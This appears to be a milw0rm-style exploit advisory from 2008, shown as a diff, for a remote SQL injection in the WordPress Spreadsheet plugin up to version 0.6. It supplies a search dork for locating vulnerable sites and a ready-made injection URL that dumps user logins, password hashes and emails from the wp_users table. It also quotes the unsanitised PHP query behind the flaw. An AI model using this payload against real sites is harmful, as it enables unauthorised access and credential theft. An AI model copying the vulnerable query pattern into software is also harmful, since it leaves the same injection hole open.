@@ -1,0 +1,23 @@
+===========================================
+There's standart sql-injection in Spreadsheet <= 0.6 Plugin
+# Author : 1ten0.0net1
+# Script : Wordpress Plugin Spreadsheet <= 0.6 v.
+# Download : http://timrohrer.com/blog/?page_id=71
+# BUG :  Remote SQL-Injection Vulnerability
+# Dork : inurl:/wp-content/plugins/wpSS/
+Example:
+http://site.com/wp-content/plugins/wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain
+===========================================
+Vulnerable code:
+ss_load.php
+    $id = $_GET['ss_id'];
+....
+ss_functions.php:
+function ss_load ($id, $plain=FALSE) {
+....
+    if ($wpdb->query("SELECT * FROM $table_name WHERE id='$id'") == 0) {
+....
+
+==> Visit us @ forum.antichat.ru
+
+# milw0rm.com [2008-04-22]
